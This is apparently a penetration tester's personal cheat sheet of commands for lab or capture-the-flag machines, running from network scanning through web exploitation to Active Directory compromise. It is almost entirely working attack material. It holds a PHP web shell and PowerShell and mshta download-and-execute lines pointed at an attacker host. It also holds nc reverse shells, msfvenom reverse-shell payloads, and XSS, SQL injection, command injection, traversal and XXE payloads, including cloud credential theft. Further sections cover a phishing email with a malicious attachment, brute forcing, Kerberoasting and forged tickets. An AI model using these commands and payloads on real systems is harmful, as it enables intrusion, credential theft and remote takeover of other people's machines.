# Setup
## New Project
mkdir -p ~/Projects/"$TARGET"; cd ~/Projects/"$TARGET"; echo "cd $PWD" >> ~/.zshrc; touch usernames; touch passwords; echo "\nadministrator\nguest\nkrbtgt\ndomain admins\nroot\nbin\nnone" > usernames; echo "\n" > passwords; echo tmux list-windows -F '#{window_id}' | xargs -I {} tmux list-panes -t {} -F '#{pane_id}' | while read pane_id; do tmux send-keys -t $pane_id 'source ~/.zshrc' C-m; tmux send-keys -t $pane_id C-l; done

## Configuring Adapter
vmware
Edit ➜ Virtual Network Adapter ➜ Change Settings ➜ Add Network ➜ VMnet10
Bridged ➜ Bridged to: Realtek USB GbE Family Controller #2 ➜ Rename Network ➜ Hard Bridged ➜ OK
VM ➜ Settings ➜ Network Adapter ➜ Custom: Hard Bridge

sudo nmcli connection show
uuid=e06de7a8-e79d-3cce-8063-fcaba7c7d6d0
ip route
sudo nmcli con modify $uuid ipv4.addresses 172.16.1.201/24
sudo nmcli con modify $uuid ipv4.gateway 172.16.1.1
sudo nmcli con modify $uuid ipv4.dns 8.8.8.8
sudo nmcli con modify $uuid ipv4.method manual
sudo systemctl restart NetworkManager.service
sudo systemctl restart networking.service

sudo ifconfig adapter0 down
sudo ip link delete adapter0
sudo ip addr del 10.130.108.117/24 dev adapter0

# Discovery
## Nessus
systemctl status nessusd
systemctl start nessusd
chromium "https://localhost:8834"

## External Scan
(sudo nmap -Pn -n -sS "$TARGET" --open -g53 --min-rate 500 --max-rate 1500 -oA 'TCP_1000_$TARGET' &)
(sudo nmap -Pn -n -sU "$TARGET" --open -g53 --min-rate 500 --max-rate 1500 -oA 'UDP_1000_$TARGET' &)
(sudo nmap -Pn -n -sS "$TARGET" --open -p- -g53 --min-rate 500 --max-rate 1500 -oA 'TCP_ALL_$TARGET' &)
(sudo nmap -Pn -n -sU "$TARGET" --open -p- -g53 --min-rate 500 --max-rate 1500 -oA 'UDP_ALL_$TARGET' &)
(udpy_proto_scanner.py $TARGET | tee UDP_PROTO_$TARGET &)

## Internal Scan
nbtscan 10.129.121.0/24
nbtscan-unixwiz 10.129.121.0/24 -m -n -w 0 | sort -k2
netdiscover
ipcalc 172.16.1.73/24     Netmask:   255.255.255.0 = 24

# Information Gathering
## Service Scan
PORTS=$(cat *_$TARGET.nmap | cut -d '/' -f 1 | sort -nu | awk '/^[0-9]/ {printf "%s,", $1}' | sed 's/,$//'); echo $PORTS

(sudo nmap -Pn -n -sC "$TARGET" --open -p"$PORTS" -g53 --min-rate 500 --max-rate 1500 -oA 'SCRIPTS_$TARGET' &)
(sudo nmap -Pn -n --script=vuln "$TARGET" --open -p"$PORTS" -g53 --min-rate 500 --max-rate 1500 -oA 'VULN_$TARGET' &)

cat *.nmap

## enum4linux
(enum4linux $TARGET -u '$USERNAME' -p '$PASSWORD' -A > enum4linux_$TARGET &)
cat usernames | sed -n 's/.*\\//p' | cut -d ' ' -f 1

## Web
[*] Technology
whatweb http://$TARGET

[*] WAF
wafw00f http://$TARGET

[*] Subdomain
gobuster vhost --append-domain -u $DOM -k -r -t200 -q --exclude-length 282 \
-w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt \
| grep -oP '(?<=Found: )[^ ]+'

[*] Directory
dirsearch -u http://$TARGET -w /usr/share/wordlists/assetnote/directories.txt -x 400,404

ffuf -u http://"$TARGET"/FUZZ -t 800 -rate 20000 \
-e txt,pdf,conf,config,cnf,html,php,asp,aspx,js \
-v -recursion -recursion-depth 2 \
-w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt \
2>/dev/null | grep -oP '(http.*)(?<!/)$'

feroxbuster -u http://$TARGET \
-w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
-d 4 -k -C 404 \
-x pdf txt bak backup conf config cnf php asp aspx js \
--dont-scan '(?i)(vendor|img|.*(min|gif|css|images|png|jpg)$)'

[*] Traversal
ffuf -u 'http://$TARGET/nav.php?page=FUZZ' -t 400 -rate 10000 -v -mc 200 \
-w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
2>/dev/null | grep -oP '(http.*)(?<!/)$'

[*] WordPress
wpscan --url http://$TARGET/wordpress --enumerate
Download source > https://develop.svn.wordpress.org/tags/x.x.x/src/

# Exploitation
## Hosts
echo "$TARGET $DOM $DC" | sudo tee -a /etc/hosts

## Sorting Files
sort -u usernames | tee usernames
sort -u passwords | tee passwords

## File Transfer
powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://$MYIP:8888/tools.ps1'); dir C:\programdata\tmp"
set cmd powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://$MYIP:8888/tools.ps1');"
wget http://$MYIP:8888/shell.aspx -o shell.aspx
curl http://$MYIP:8888/shell.aspx -o shell.aspx
certutil -urlcache -f http://$MYIP:8888/shell.aspx shell.aspx

## Web
[*] Web Shell
<html>
<body style="background: black;color: whitesmoke;font-family: 'Fira Code', 'Consolas', 'Liberation Mono', 'Courier New', monospace;font-size: 15px;margin: 10px 0 0 18px;">
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
    <input id="cmd" type="TEXT" name="cmd" autofocus size="80" value="<?php echo isset($_GET['cmd']) ? htmlentities($_GET['cmd']) : ''; ?>" style="outline: none; background: inherit;border: none;font-size: 16px;color: inherit;font-family: inherit;font-weight: 800;">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {system($_GET['cmd'] . ' 2>&1');}
?>
</pre>
<script>
    var cmdElement = document.getElementById('cmd');
    cmdElement.focus();
    cmdElement.setSelectionRange(cmdElement.value.length, cmdElement.value.length);
</script>
</body>
</html>

[*] File Upload
curl --upload-file shell.php http://$TARGET:80/upload/
shell.PhP
shell.phar
shell.P.phpHP
shell%2EPHP
shell%2Ephar%00%2Epng
shell%2Ephar%00.png

[*] Traversal
..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd
..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
GET /image?filename=/var/www/images/../../../etc/passwd
GET /image?filename=../../../etc/passwd%00.png

[*] XSS
<img src=x>'"${{7*7}}
<svgonload=alert(document.cookie)>
<svg/onload=alert(document.cookie)>
"onmouseover="alert(document.cookie)
javascript:alert(document.cookie)
?returnPath=javascript:alert(document.cookie)
<iframe src="https://vulnerable.site/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
{{$on.constructor('alert(document.cookie)')()}}
\"-alert(document.cookie)}//
<<<>>><img src="x"/onerror=alert(document.cookie)>
</><TAG/EVENT="">
<iframe src="https://$TARGET/?search=%22%3E%3Cbody%20onresize%3Dalert%28document%2Ecookie%29%3E" onload=this.style.width='0px'>

[*] SQLi
' OR 1=1 -- #
OR 1=1 -- #
AND 1=1 -- #
' AND 1=1 -- #
administrator'-- #
' ORDER BY 1 -- #
' UNION SELECT table_name,NULL FROM information_schema.tables -- #
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users_efwvmk' -- #
' UNION SELECT username_aakuyh,password_wrukls FROM users_efwvmk -- #
' AND 1=(SELECT 1 FROM users LIMIT 1) -- #
' AND 1=(SELECT 1 FROM users WHERE username='administrator') -- #
' AND 1=(SELECT 1 FROM users WHERE username='administrator' AND LENGTH(password)=20) -- #
' AND '$x$'=(SELECT SUBSTR(password,$1$,1) FROM users WHERE username='administrator') -- #
"AND"1"="1
year=2005 ORDER BY 4
username=admin', 'password', true, '2025-02-03 15:14:29.253', 2133415744)-- #&password1=admin&password2=admin	# INSERT INTO sqlinjection004_users (username, password, isAdmin, lastLogin, lastIP)
username=target';-- # &password1=test&password2=test 

[*] Command Injection
;id #
;sleep+10;
;sleep+10;cat+/etc/passwd+>+/var/www/images/test.txt;
;cat /etc/passwd
;echo 'L2V0Yy9wYXNzd2Q=' | base64 -d | xargs cat
;cat "$(echo 'L2V0Yy9wYXNzd2Q=' | base64 -d)"
;ls -la "$(echo 'Li4vLi4vLi4vCg==' | base64 -d)"
;ls -laR "$(echo 'Li4vLi4vLi4vLi4vLi4vCg==' | base64 -d)"
logname=;cat /etc/passwd > log.txt
&amp;id

[*] Content Types
application/x-httpd-php
application/json
application/javascript
application/xml
application/x-www-form-urlencoded
application/pdf
application/zip
application/x-tar
application/x-gzip
multipart/form-data
image/jpeg
image/png
image/gif
text/html
text/plain
text/css

[*] HTTP Methods
GET
HEAD
POST
PUT
DELETE
CONNECT
OPTIONS
TRACE
PATCH

[*] Headers
X-Forwarded-For: 1

[*] sqlmap
sqlmap -r request --batch --level 3 -dbs
sqlmap -r request --batch --level 3 -D temp_db --tables
sqlmap -r request --batch --level 3 -D temp_db -T users --columns
sqlmap -r request --batch --level 3 -D temp_db -T users --columns --dump

[*] XXE
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE x [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck>
	<productId>&xxe;</productId>
	<storeId>1</storeId>
</stockCheck>

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE x [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/"> ]>
<stockCheck>
	<productId>&xxe;</productId>
	<storeId>1</storeId>
</stockCheck>

productId=<xi:include xmlns:xi="http://www.w3.org/2001/XInclude" href="file:///etc/passwd" parse="text" />

Content-Type: text/xml

<?xml version="1.0" encoding="UTF-8"?><x>x</x>

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE x [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>

[*] JWT
git clone https://github.com/wallarm/jwt-secrets.git ~/.git/jwt_secrets

hashcat -a 0 -m 16500 <JWT> ~/.git/jwt_secrets/jwt.secrets.list

[*] GraphQL
Content-Type: application/json

{  "query":"{\n\n__schema\n\n{queryType{name}}"  }

{"query":"{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}"}

{"query":"{\u000A\n\r\t__schema\u000A\n\r\t{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}"}

/api?query=query+IntrospectionQuery+%7B%0A++%0A%0A%0A%0A%5f%5fschema%0A%0A%0A%0A+%7B%0A++++queryType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++mutationType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++subscriptionType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++types+%7B%0D%0A++++++...FullType%0D%0A++++%7D%0D%0A++++directives+%7B%0D%0A++++++name%0D%0A++++++description%0D%0A++++++args+%7B%0D%0A++++++++...InputValue%0D%0A++++++%7D%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0A%0D%0Afragment+FullType+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++description%0D%0A++fields%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++args+%7B%0D%0A++++++...InputValue%0D%0A++++%7D%0D%0A++++type+%7B%0D%0A++++++...TypeRef%0D%0A++++%7D%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++inputFields+%7B%0D%0A++++...InputValue%0D%0A++%7D%0D%0A++interfaces+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++enumValues%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++possibleTypes+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A%7D%0D%0A%0D%0Afragment+InputValue+on+__InputValue+%7B%0D%0A++name%0D%0A++description%0D%0A++type+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++defaultValue%0D%0A%7D%0D%0A%0D%0Afragment+TypeRef+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++ofType+%7B%0D%0A++++kind%0D%0A++++name%0D%0A++++ofType+%7B%0D%0A++++++kind%0D%0A++++++name%0D%0A++++++ofType+%7B%0D%0A++++++++kind%0D%0A++++++++name%0D%0A++++++%7D%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0A

nano gql; gqlspection -f gql

https://datafetcher.com/graphql-json-body-converter

{  "query": "query { getUser(id: 3) { id username }}"  }

{  "query": "mutation { deleteOrganizationUser(input: {id:3}) { user { id username } }}"  }

[*] Git
git add shell.*;git commit -m 'added';git push http://43ce39bb0bd6bc489284f2905f033ca467a6362f@$TARGET:3000/$USERNAME/website.git

## Infrastructure
[*] Shells
+---------- Reverse ----------+
C:\programdata\tmp\nc.exe $MYIP 5555 -e cmd.exe
C:\programdata\tmp\EfsPotato.exe "C:\programdata\tmp\nc.exe $MYIP 5555 -e cmd"
C:\programdata\tmp\FullPowers.exe -z -c "C:\programdata\tmp\EfsPotato.exe \"C:\programdata\tmp\nc.exe $MYIP 5555 -e cmd\""
C:\programdata\tmp\SigmaPotato.exe --revshell $MYIP 5555
echo '<?php system('mshta http://$MYIP:8080/7qvnY13vrce.hta');?>' > shell.php

+---------- Listeners ----------+
python3 -m http.server 8888 -d ~/Upload
rlwrap nc -lvnp 5555
rlwrap msfconsole -q -x "use exploit/windows/misc/hta_server; set LHOST $MYIP; set LPORT 5555; set SRVHOST $MYIP; set TARGET 1; set payload windows/x64/meterpreter/reverse_tcp; run"
rlwrap msfconsole -q -x "use exploit/windows/misc/hta_server; set LHOST $MYIP; set LPORT 5555; set SRVHOST $MYIP; set TARGET 0; set payload windows/meterpreter/reverse_tcp; run"
rlwrap msfconsole -q -x "use multi/handler; set payload php/meterpreter/reverse_tcp; set LHOST $MYIP; set LPORT 5555; run"
rlwrap msfconsole -q -x "use multi/handler; set payload php/reverse_php; set LHOST $MYIP; set LPORT 5555; run"

rlwrap msfconsole -q -x "use multi/handler; set payload windows/x64/shell_reverse_tcp; set LHOST $MYIP; set LPORT 5555; run"
rlwrap msfconsole -q -x "use multi/handler; set payload windows/x64/powershell_reverse_tcp; set LHOST $MYIP; set LPORT 5555; run"

+---------- MSFVenom ----------+
msfvenom -p php/reverse_php LHOST=$MYIP LPORT=5555 -f raw -o shell.php
msfvenom -p php/meterpreter/reverse_tcp LHOST=$MYIP LPORT=5555 -f raw -o shell.php

msfvenom -p windows/x64/shell_reverse_tcp LHOST=$MYIP LPORT=5555 -f aspx -o shell.aspx
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$MYIP LPORT=5555 -f exe -o shell.exe
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$MYIP LPORT=5555 -f msi -o shell.msi
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$MYIP LPORT=5555 -f exe -o shell.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$MYIP LPORT=5555 -f dll -o shell.dll
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$MYIP LPORT=5555 -f msi -o shell.msi

msfvenom -p windows/shell_reverse_tcp LHOST=$MYIP LPORT=5555 -f aspx -o shell.aspx
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$MYIP LPORT=5555 -f exe -o shell.exe
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$MYIP LPORT=5555 -f msi -o shell.msi
msfvenom -p windows/shell_reverse_tcp LHOST=$MYIP LPORT=5555 -f exe -o shell.exe
msfvenom -p windows/shell_reverse_tcp LHOST=$MYIP LPORT=5555 -f dll -o shell.dll
msfvenom -p windows/shell_reverse_tcp LHOST=$MYIP LPORT=5555 -f msi -o shell.msi

msfvenom -p python/meterpreter/reverse_tcp LHOST=$MYIP LPORT=5555 -f raw -o shell.py
msfvenom -p linux/x64/shell_reverse_tcp LHOST=$MYIP LPORT=5555 -f elf -o shell.elf
msfvenom -p linux/x86/shell_reverse_tcp LHOST=$MYIP LPORT=5555 -f elf -o shell.elf

[*] Cracking
+---------- Mutated Wordlist ----------+
psudohash.py -w phantom -y 2023-2025 -cpb -cpa -cpo -ap '~,`,!,@,#,$,%,^,&,*,(,),_,+,{,},|,:,",<,>,?,,,.,/,;,[,],\,-' -o mutated.list

+---------- Hashcat ----------+
hashcat -m 13721 FILENAME.hc mutated.list

0 	MD5
100	SHA1
1400	SHA256
1700	SHA512
500 	md5crypt
1800 	sha512crypt
7400 	sha256crypt
1500 	descrypt
3200 	bcrypt
1000 	NTLM
3000 	LM
5500 	NetNTLMv1
5600 	NetNTLMv2
400     phpass (WordPress, Joomla, phpBB)
18200	Kerberos 5 TGS-REP etype 17
18300	Kerberos 5 TGS-REP etype 18
13100 	Kerberos 5 TGS-REP etype 23
7500 	Kerberos 5 AS-REQ Pre-Auth etype 23
15300 	DPAPI masterkey
15900 	DPAPI domain backupkey
2100	Domain Cached Credentials (DCC)
1100	Domain Cached Credentials 2 (DCC2)
11300	MSSQL 2012+
13200	AxCrypt
13400 	KeePass
12500 	RAR3-hp
13000 	RAR5
13600 	WinZip
17220 	7-Zip
18300 	BitLocker
13711 	VeraCrypt
9400	MS Office 2007
9500	MS Office 2010
9600	MS Office 2013

[*] (21) FTP
wget ftp://$TARGET --ftp-user='$USERNAME' --ftp-password='$PASSWORD' -m -q --no-parent --cut-dirs=1 --no-directories -P ftp
curl ftp://$TARGET -u '$USERNAME':'$PASSWORD' -T filename.txt

hydra -L usernames -P passwords ftp://$TARGET -t35
nxc ftp "$TARGET" -u '$USERNAME' -p '$PASSWORD' --ls

ftp '$USERNAME'@"$TARGET"
anonymous
ls -a
binary
ascii
get file.txt -

[*] (22) SSH
hydra ssh://$TARGET -L usernames -P passwords -t35

ssh-add -D

yes | ssh-keygen -t ed25519 -f key -N '' > /dev/null; cat key.pub
ssh $USERNAME@$TARGET -i key.pub -L 33060:Localhost:33060 -L 5000:Localhost:5000
-PubkeyAcceptedKeyTypes (ssh-rsa, ecdsa-sha2-nistp256, ecdsa-sha2-nistp384, ecdsa-sha2-nistp521, ssh-ed25519, ssh-dss)
echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINzZbkLBUl5mk0AW8lPkWRXrupSiydDr8GJauiEAu3Ze' > $TARGET ~/.ssh/authorized_keys
$USERNAME@$TARGET -i key.pub

nano key; chmod 600 key; $USERNAME@$TARGET -i key -o PubkeyAcceptedAlgorithms=ssh-rsa

[*] (23) Telnet
hydra telnet://$TARGET  -L usernames -P passwords -t35

telnet --user $USERNAME $TARGET

[*] (25) SMTP
nmap -p 25 --script="smtp* and not brute" --script-args "smtp-enum-users.methods={VRFY},userdb=/usr/share/nmap/nselib/data/usernames.lst" $TARGET

sendemail \
        -s $TARGET \
        -f "Admin Team <admin@$DOM>" \
        -t career@$DOM \
        -o tls=no \
        -u "Subject: Important Document" \
        -m "This is the document you asked for. Thanks again" \
        -a "$HOME/.msf4/local/msf.odt"

[*] (53) DNS
dig axfr @$TARGET $DOM

[*] (79) Finger
finger '$USERNAME'@$TARGET
while read -r user; do finger "$user"@$TARGET; done < usernames

[*] ADCS
chromium http://$TARGET/certsrv
nxc ldap $TARGET --dns-server $TARGET -u '$USERNAME' -p '$PASSWORD' -M adcs
nxc ldap $TARGET --dns-server $TARGET -u '$USERNAME' -p '$PASSWORD' -k -M adcs

+---------- Kerberos Negotiation ----------+
certipy-ad find -dc-ip $TARGET -target $DC -k -no-pass -vulnerable -enabled -stdout
certipy-ad req -dc-ip $TARGET -target $DC -k -no-pass -ca '$CA' -upn 'Administrator' -template 'RetroClients' -key-size '4096'

+---------- NTLM Negotiation ----------+
certipy-ad find -dc-ip $TARGET -target $DC -u '$USERNAME' -p '$PASSWORD' -vulnerable -enabled -stdout
certipy-ad req -dc-ip $TARGET -target $DC -u '$USERNAME' -p '$PASSWORD' -ca '$CA' -upn 'Administrator' -template 'RetroClients' -key-size '4096'

[*] (88) Kerberos
+---------- .Ccache ----------+
export KRB5CCNAME="$PWD/Guest.ccache"; chmod 0600 "$KRB5CCNAME"
impacket-describeTicket Guest.ccache | grep 'Ticket Session Key' | cut -d ':' -f 2 | xargs

export KRB5CCNAME="$PWD/$USERNAME.ccache"; chmod 0600 "$KRB5CCNAME"
impacket-describeTicket $USERNAME.ccache | grep 'Ticket Session Key' | cut -d ':' -f 2 | xargs

+---------- Kerberos Negotiation ----------+
impacket-getTGT -dc-ip $TARGET '$DOM'/'Guest' -no-pass
impacket-getTGT -dc-ip $TARGET '$DOM'/'$USERNAME':'$PASSWORD'
impacket-getTGT -dc-ip $TARGET -hashes :$(echo '$PASSWORD' | 2ntlm) $DOM/$USERNAME
impacket-GetUserSPNs -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -request
impacket-GetUserSPNs -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -usersfile usernames
impacket-GetNPUsers -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -usersfile usernames
impacket-GetADUsers -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -all | awk '/---/{flag=1;next} flag {print $1}'
impacket-GetADComputers -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass
impacket-changepasswd -dc-ip $TARGET -newhashes :$(impacket-describeTicket $USERNAME.ccache | grep 'Ticket Session Key' | cut -d ':' -f 2 | xargs) '$DOM'/'$USERNAME':'$PASSWORD'@$TARGET
while IFS= read -r user; do echo "\n*-------------------*\n$user"; impacket-GetUserSPNs -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -request-user '$user'; done < usernames
impacket-getST -dc-ip $TARGET -u2u -impersonate "Administrator" -spn "host/$DC" '$DOM'/'$USERNAME' -k -no-pass 2>/dev/null

+---------- NTLM Negotiation ----------+
impacket-getTGT -dc-ip $TARGET '$DOM'/'Guest' -no-pass
impacket-getTGT -dc-ip $TARGET '$DOM'/'$USERNAME':'$PASSWORD'
impacket-getTGT -dc-ip $TARGET -hashes :$(echo '$PASSWORD' | 2ntlm) $DOM/$USERNAME
impacket-GetUserSPNs -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD' -request
impacket-GetUserSPNs -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD' -usersfile usernames
impacket-GetNPUsers -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD' -usersfile usernames
impacket-GetADUsers -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD' -all | awk '/---/{flag=1;next} flag {print $1}'
impacket-GetADComputers -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD'
impacket-changepasswd -dc-ip $TARGET $DOM/'$USERNAME'@$TARGET -newpass '123qweasdF!' -altuser '$USERNAME' -altpass '$PASSWORD' -p kpasswd -reset
impacket-changepasswd -dc-ip $TARGET -newhashes :$(impacket-describeTicket $USERNAME.ccache | grep 'Ticket Session Key' | cut -d ':' -f 2 | xargs) '$DOM'/'$USERNAME':'$PASSWORD'@$TARGET
while IFS= read -r user; do echo "\n*-------------------*\n$user"; impacket-GetUserSPNs -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD' -request-user '$user'; done < usernames
impacket-rbcd -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD' -delegate-from '$USERNAME' -delegate-to 'DC$' -action 'write'
impacket-getST -dc-ip $TARGET -u2u -impersonate "Administrator" -spn "host/$DC" '$DOM'/'$USERNAME':'$PASSWORD' 2>/dev/null

bloodyAD --dc-ip $TARGET -d '$DOM' -u '$USERNAME' -p '$PASSWORD' add groupMember 'GROUP' 'USER'

+---------- Ticket Attacks ----------+
sudo apt install -y heimdal-clients libsasl2-modules-gssapi-heimdal
KRB5_FILE="custom_krb5.conf";export KRB5_CONFIG="$PWD/$KRB5_FILE"; nano ./"$KRB5_FILE"
[libdefaults]
    default_realm = $KRB5DOM
    dns_lookup_realm = true
    dns_lookup_kdc = true

[realms]
    $KRB5DOM = {
        kdc = $DC
        admin_server = $DC
        default_domain = $DC
    }

[domain_realm]
    $DOM = $KRB5DOM
    .$DOM = $KRB5DOM

TGT=$(impacket-getTGT $DOM/'$USERNAME':'$PASSWORD' -dc-ip $TARGET | grep -oP '(?<=\[\*\] Saving ticket in ).*'); echo "[*] Saving ticket in $TGT"; export KRB5CCNAME="$TGT"; chmod 0600 "$TGT"; echo '$PASSWORD' > kpassfile; kinit --password-file='kpassfile' -c "$KRB5CCNAME" '$USERNAME@$KRB5DOM'; klist

ST='cifs/$DC'; F=$(impacket-getST $DOM/'$USERNAME':'$PASSWORD' -dc-ip $TARGET -spn $ST | grep -oP '(?<=\[\*\] Saving ticket in ).*'); echo "[*] Saving ticket in $F"; export KRB5CCNAME="$F"; chmod 0600 "$F"; echo '$PASSWORD' > kpassfile; kinit --password-file='kpassfile' -c "$KRB5CCNAME" '$USERNAME@$KRB5DOM'; klist

+---------- Silver Ticket Attacks ----------+
TICKET_SID=$(impacket-getPac '$DOM'/'$USERNAME':'$PASSWORD' -targetUser 'Administrator' 2>/dev/null | grep 'Domain SID: ' | cut -d ':' -f 2- | tr -d ' ')
TICKET_SPN=$(impacket-GetUserSPNs -dc-ip $TARGET '$DOM'/'$USERNAME':'$PASSWORD' -request | awk '{print $1}' | grep -vE 'Impacket|\$krb5|Service|----|^$|\[' | cut -d '/' -f 1)
TICKET_NTLM=$(echo -n '$PASSWORD' | iconv -t UTF-16LE | openssl dgst -md4 | cut -d ' ' -f 2 | sed 's/.*/\U&/')
echo "$TICKET_SID\n$TICKET_SPN\n$TICKET_NTLM"
impacket-ticketer -domain '$DOM' -domain-sid "$TICKET_SID" -nthash "$TICKET_NTLM" -spn "$TICKET_SPN/$DOM" Administrator 2>/dev/null

[*] (161) SNMP
(onesixtyone $TARGET -c /usr/share/wordlists/seclists/Discovery/SNMP/snmp.txt -w 5 -o SNMPsmall.onesixtyone &)
(onesixtyone $TARGET -c /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -w 5 -o SNMPhuge.onesixtyone &)
(hydra snmpv2c://$TARGET -P /usr/share/wordlists/seclists/Discovery/SNMP/snmp.txt -t60 -I 2>/dev/null | grep '\[snmp\]' | tee SNMPsmall.hydra &)
(hydra snmpv2c://$TARGET - P /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -t60 -I 2>/dev/null | grep '\[snmp\]' | tee SNMPhuge.hydra &)

cat *.onesixtyone
cat *.hydra

snmp-check $TARGET -c COMMUNITY -v 2c

sudo nmap -sU -p161 --script "snmp* and not snmp-brute" $TARGET
snmpwalk -v2c -c COMMUNITY $TARGET | grep 'STRING:'

[*] (389) LDAP
nmap --script "ldap* and not brute" -p 389 "$TARGET" -oA 'LDAP_$TARGET'
nxc ldap $TARGET --dns-server $TARGET -u usernames -p passwords --continue-on-success
nxc ldap $TARGET --dns-server $TARGET -u usernames -p passwords -M adcs
nxc ldap $TARGET --dns-server $TARGET -u usernames -p passwords --continue-on-success -k
nxc ldap $TARGET --dns-server $TARGET -u usernames -p passwords -k -M adcs
nxc ldap $TARGET --dns-server $TARGET -u '$USERNAME' -p '$PASSWORD' -M get-desc-users
nxc ldap $TARGET --dns-server $TARGET -u '$USERNAME' -p '$PASSWORD' --get-sid
nxc ldap $TARGET --dns-server $TARGET -u '$USERNAME' -p '$PASSWORD' --query "(servicePrincipalName=*)" "cn sAMAccountName servicePrincipalName"
nxc ldap $TARGET --dns-server $TARGET -u usernames -p passwords --continue-on-success --kerberoasting krb5-hashes
nxc ldap $TARGET --dns-server $TARGET -u usernames -p passwords --continue-on-success --trusted-for-delegation
nxc ldap $TARGET --dns-server $TARGET -u '$USERNAME' -p '$PASSWORD' --bloodhound -c all
nxc ldap $TARGET --dns-server $TARGET -u '$USERNAME' -p '$PASSWORD' --dc-list --query "(SAMAccountType=805306369)" "SAMAccountName"
nxc ldap $TARGET -u '$USERNAME' -p '$PASSWORD' --query "(SAMAccountType=805306369)" "SAMAccountName" | awk '{print $6}' | grep '\$' > machines | sed 's/.$//' | tr '[:upper:]' '[:lower:]' > machines_pw; nxc smb $TARGET -u machines -p machines_pw | grep -oP '\[-\].*TRUST_ACCOUNT.*' | while read line; do echo -e "\e[1;33m$line <--- CHANGE PASSWORD NOW\!\e[0m"; done

sudo neo4j start
chromium "http://localhost:7474"
bloodhound
neo4j:neo4j
neo4j:bloodhound
MATCH (u:User) RETURN u

godap $TARGET -u '$USERNAME' -p '$PASSWORD' -d '$DOM'

[*] (445) SMB
nxc smb "$TARGET" -u usernames -p passwords --continue-on-success
nxc smb "$TARGET" -u '$USERNAME' -p '$PASSWORD' --shares
nxc smb "$TARGET" -u '$USERNAME' -p '$PASSWORD' --rid-brute 10000 | grep -oP '(?<=\\)[^ (\n]+(?=.*\(SidTypeUser\))' >> usernames; sort -u usernames | tee usernames; nxc smb "$TARGET" -u usernames -p passwords --continue-on-success

